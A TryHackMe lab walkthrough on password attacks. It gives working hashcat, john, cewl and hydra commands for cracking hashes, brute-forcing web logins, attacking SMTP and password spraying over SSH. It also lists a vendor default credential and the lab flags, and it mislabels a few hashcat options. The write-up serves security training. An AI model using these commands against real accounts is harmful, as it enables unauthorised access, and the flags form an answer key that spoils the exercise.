![image](https://user-images.githubusercontent.com/66912443/186160038-28376090-59e3-4098-81d8-eaf74ee45fd0.png)

____________________________________________________________________________________________________________________

## Password Attacking Techniques 

<details>
<summary> Which type of password attack is performed locally? </summary>

____________________________________________________________________________________________________________________

<p></p>
Between 'Password Cracking' and 'Password Guessing', <i>'Password Cracking'</i> is the correct answer as this usually involves cracking hashes on the attackers local machine.

____________________________________________________________________________________________________________________

</details>

## Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists

<details>
<summary> What is the Juniper Networks ISG 2000 default password? </summary>

____________________________________________________________________________________________________________________

<p></p>

Keeping the default credentials on your device is a huge security risk, and this is exactly what this question is about. By not changing the password you leave your device open to anyone who can do a quick google search and find the user's guide to the device:

<p align="center">
  <img src="https://user-images.githubusercontent.com/66912443/185885338-5fca362b-1de2-4a72-a77f-d1cb88977969.png" >
</p>

This, from the aformentioned official user guide to the 'Juniper Networks ISG 2000' reveals both the username and password to be 'netscreen'
  <p></p>
  
  ``` Source = https://www.juniper.net/documentation/hardware/netscreen-systems/netscreen-systems50/ug_isg_2000.pdf ```
____________________________________________________________________________________________________________________

</details>

## Password Profiling #2 - Keyspace Technique and CUPP

<details>
<summary> Run the following crunch command: crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate? </summary>

____________________________________________________________________________________________________________________

<p></p>
Crunch, at least for me was not installed on my Linux device, this was easily fixable by running the following:
  <p></p>
  
  ``` sudo apt install crunch ```
  
  <p></p>
  Once that has finished installing you are good to run the command revealing the following lines:
  <p></p>
  
  <p align="center">
  <img src="https://user-images.githubusercontent.com/66912443/185888501-e0a3c124-60f3-4e58-8687-9f5db95ee26a.png" >
</p>
____________________________________________________________________________________________________________________

</details>

<details>
<summary> What is the crunch command to generate a list containing THM@! and output to a filed named tryhackme.txt? </summary>
<p></p>

   This task is to create a LIST containing this password, not just generate the word itself. Using the following logic:
  
  ```
  @ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space
  ```
  
"THM" is a given and is known so does not need to have every combination generated with "," as that list would be sooooo long. The only parts that would differ would be "@" and "!". We can ascertain that as "@" and "!" are special characters, they must be represented by the "^" symbol. The final command would be as so:
  
  ``` crunch 5 5 -t THM^^ -o tryhackme.txt ```
____________________________________________________________________________________________________________________

</details>

## Offline Attacks - Dictionary and Brute-Force

<details>
<summary> 
Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type? </summary>

____________________________________________________________________________________________________________________

<p></p>

The tool of choice to identify hashes, 'hashid' was not installed on my Linux system by default. This can be fixed with the following command:
  
  ``` sudo apt install hashid ```
  
  Running the following revealed the answer:
  
  ![image](https://user-images.githubusercontent.com/66912443/185891467-ebcb94f8-a836-442f-9316-c7eeec0e9aca.png)
____________________________________________________________________________________________________________________

</details>

<details>
<summary> Perform a dictionary attack against the following hash: (The same one) What is the cracked value? Use rockyou.txt. </summary>

____________________________________________________________________________________________________________________

<p></p>
Now that we known the hash is SHA-1, this helps with filling out the fields when we pass it through hashcat. From 'hashcat.net', we can ascertain the hash-mode code for SHA-1 is 100.
  <p></p>
  <p align="center">
  <img src="https://user-images.githubusercontent.com/66912443/185892364-a0547a46-cf42-40f5-b150-8a891a9a15c4.png" >
  </p>

  Now the command can be completed: 
  
  ``` hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f [location of rockyou.txt] ```
  
  "-a" determines the type of attack (0 meaning dictionary)  
  "-m" determines the hash mode used (100 for SHA-1)
  
  <p></p>
  
  Once you have run this command and it has been cracked, (this may take a while) it will show the following:
  <p></p>
  <p align="center">
  <img src="https://user-images.githubusercontent.com/66912443/185894232-5897b833-e42f-470b-be91-fdd5ea721a89.png" >
  </p>

  To get your answer, press the up arrow to get the previous command again and add "--show"
  
  <p></p>
  <p align="center">
  <img src="https://user-images.githubusercontent.com/66912443/185894740-3fe0b40d-b264-4898-b2cd-6d590734cbd7.png" >
  </p>
  ____________________________________________________________________________________________________________________

</details>

<details>
<summary> Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9] </summary>

____________________________________________________________________________________________________________________

<p></p>

Referring back to the table in the previous question, we know that MD5 is represented by the code "0".

``` hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d ```

"-a" determines the type of attack (3 meaning dictionary)  
"-m" determines the hash mode used (100 for SHA-1)  
"?d?d?d?d" indicates for the brute force to look for a 4 digit character (1 ?d = 1 digit)
  <p></p>
  The only step left is to run the command as we have everything we need already:
  <p></p>
<p align="center">
  <img src="https://user-images.githubusercontent.com/66912443/185899243-2b182574-6892-49f4-b22d-996a8667246b.png" >
  </p>
____________________________________________________________________________________________________________________

</details>

## Offline Attacks - Rule-Based

<details>
<summary> What would (be) the syntax you would use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@? </summary>

____________________________________________________________________________________________________________________

<p></p>
  
"Az" Specifies there is a word here 
  
  
  "[0-9]" Specifies there is a number. There must be quotations on either side of the closed square brackets and the brackets can be put next to each other for more numbers  
  
  
  "^" Means append a special character to the beginning of each word  
  
  
  "$" Means append a special character to the end of each word
  
  With this all in mind, it can be put together to create the following:
  
  
``` Az"[0-9][0-9]" ^[!@] ``` 


____________________________________________________________________________________________________________________

</details>

## Online password attacks

<details>
<summary> Can you guess the FTP credentials without brute-forcing? What is the flag? </summary>

____________________________________________________________________________________________________________________

<p></p>

Sometimes FTP servers have an 'anonymous' account left open. This allows access to a server to get information that is publically available, however in this case it can be used for more harm than good. As seen below using the username 'anonymous' with no password gave me access to this ftp server.

  ![image](https://user-images.githubusercontent.com/66912443/185905336-bb588089-1d99-4759-b50f-d12ae52c5447.png)
  
  Listing all reveals a directory known as 'files' which within there lies the flag...
  
  ![image](https://user-images.githubusercontent.com/66912443/185905628-bc810e0d-8669-40ba-a88a-b23a376e3192.png)
  
  Using 'get', the flag is transferred to my machine and the flag is revealed: 
  
  ``` THM{d0abe799f25738ad739c20301aed357b} ```
  ____________________________________________________________________________________________________________________

</details>

<details>
<summary> What is the password? (for pittman@clinic.thmredteam.com) Note that the password format is as follows: [symbol][dictionary word][0-9][0-9]. </summary>

____________________________________________________________________________________________________________________

<p></p>

 To make this easier, first its best to create a new rule in john following the password formula given:
 
 ```
 sudo nano /etc/john/john.conf <--- open wherever your john is installed
 [List.Rules:THM-Example] <--- Name the rule
 Az"[0-9][0-9]" ^[!@#$] <--- Rules
 ```
 
![image](https://user-images.githubusercontent.com/66912443/185931105-66f2011c-49f9-4406-a6fb-c05226e8ff16.png)
                             
Next is to create a custom wordlist using 'cewl' from the website that the email address comes from.

``` cewl -m 8 -w clinic.lst https://clinic.thmredteam.com ```
                             
"-m" indicates the minimum wordlength to pick up (default is 3)
                             
![image](https://user-images.githubusercontent.com/66912443/185932034-5727e811-608e-43fc-8ada-a6c3f80ca2d4.png)

To create the final wordlist, the list created using cewl needs to be put through the rules created using john at the beginning.
                             
``` john --wordlist=clinic.lst --rules=THM-Example --stdout > john.txt ```
  
This will create a file full of all the password combinations.
  
![image](https://user-images.githubusercontent.com/66912443/185933639-d8c9ffc2-87e8-4605-89bc-4fa979e346b6.png)

Now, finally to use it against the SMTP server. The below command, using hydra, will run a dictionary attack against the account similarly to other examples you've seen.
  
``` hydra -l pittman@clinic.thmredteam.com -P [path to final wordlist] smtp://[ip] -v ```

After that has finished executing, as always this is computer dependent on how fast this will be, youll have your password.
  
![image](https://user-images.githubusercontent.com/66912443/185935399-ec36c083-6a8b-440a-ab62-dfcb4dc73add.png)

____________________________________________________________________________________________________________________

</details>

<details>
<summary> Perform a brute-forcing attack against the phillips account for the login page at [ip]/login-get using hydra? What is the flag? </summary>

____________________________________________________________________________________________________________________

<p></p>

To conduct the attack, we need to once again use Hydra, this time for a 'GET' attack, hence '/login-get'. 

``` hydra -l phillips -P [path] [IP] http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f ```

"-l" Specifies the username that is going to be tried with this attack  


"-P" this is the path to the wordlist used to bruteforce the password  


"http-get-form" specifies the type of attack being performed, this time a GET attack  


"^USER^" Tells the program to brute force with the username  


"^PASS^" Tells the program to brute force the password with the given file.  


"-f" Tells the program to stop once its been successful  

Putting that command through and running it will lead you to find the password, as seen below: (speed dependent on time taken as usual)
  
![image](https://user-images.githubusercontent.com/66912443/185955618-9448571b-65d0-4656-a58d-192b9886a7f5.png)

At this point you can log in as phillips and get the flag!
  
____________________________________________________________________________________________________________________

</details>

<details>
<summary> Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: [ip]/login-post/. What is the flag? </summary>

____________________________________________________________________________________________________________________

<p></p>
Similarly to the previous attack, we will be using Hydra. This time, we will be utilising a 'POST' attack instead.
  <p></p>
The hint to this question refers to the need for the 'single extra' rule in john when creating a wordlist, so the first task will be to create a new wordlist from the original 'clinic.lst' for use in the exercise. There is no need to create this rule as it is included in the 'john.conf' file.
  <p></p>
  
``` john --wordlist=clinic.lst --rules=Single-Extra --stdout > burgess.txt ```

So, now we have our wordlist it is time to conduct the attack against the '/login-post' address. The syntax for this hydra command is quite similar to the previous tasks, in fact I just copied and pasted it and changed some words around.
  <p></p>
  
  ``` hydra -l burgess -P [path] [IP] http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f ```
  
As usual, putting that command through and running it will lead you to find the password as seen below:

![image](https://user-images.githubusercontent.com/66912443/186148492-6c92dc85-1b69-4730-9543-e09e0c53c2f4.png)

 Just like before, now you can login and retrieve the flag!
  ____________________________________________________________________________________________________________________
</details>

## Password spray attack 
  
<details>
<summary> Perform a password spraying attack to get access to the SSH://[ip] server to read /etc/flag. What is the flag? </summary>

____________________________________________________________________________________________________________________

<p></p>

As this exercise relies on password spraying to accounts, first off is to create a small text file full of the usernames to use. The example below is based off of the doctors on the clinic.thmredteam.com website used in these exercises.
  
![image](https://user-images.githubusercontent.com/66912443/186150103-b54fb95a-3e4a-447c-817c-1dd9de2d681e.png)

This time, the hint exposes the password consists of "season+year+special character" so the first step would to be compile a dictionary of words that satisfy this criteria.
  
To begin, I have made a simple list of all the seasons to which to apply the rules upon for the final list. Both 'Fall' and 'Autumn' have been included as we do not know whether the user is American or not.
  
![image](https://user-images.githubusercontent.com/66912443/186151608-2f80ed7e-f197-4cea-8742-aefa5777a564.png)

Next is to create the rule at the end of john.conf.
  
![image](https://user-images.githubusercontent.com/66912443/186154033-2bdb3d84-d526-47db-9413-d3a57e8bacba.png)
 
Once all the setup is complete, the final wordlist can be created using john
  
``` john --wordlist=seasons.txt --rules=THM-SSH --stdout > final.txt ```
  
As seen below, the generated text file statisfies all requirements.
  
![image](https://user-images.githubusercontent.com/66912443/186154182-55d373bc-9bb5-481f-adb3-bc6a3fb1bc51.png)

Now for the main attack! We are once again using hydra. As always the speed of completion really does depend on the specs of your computer. This is especially important for this exercise as depending on how your wordlist is made it could end up HUGE!
  
<i> As a side note, it is important to capitalise both the "-L" and the "-P" as if it is not categorised it will take the 'username.txt' to be the password rather than the contents within it. </i>

``` hydra -L usernames.txt -P final.txt ssh://[ip] ```
  
This took me a while to complete, but once it does the password will be revealed, and im very glad I included Fall otherwise i would never have got that!

![image](https://user-images.githubusercontent.com/66912443/186159227-11e46740-c2a3-459f-8bc2-3eb0a43704f5.png)

At this stage you can successfully log in using SSH and get the flag!

![image](https://user-images.githubusercontent.com/66912443/186159588-b7c926ee-ae83-44cc-bb5b-9ab6862af33f.png)

____________________________________________________________________________________________________________________
</details>
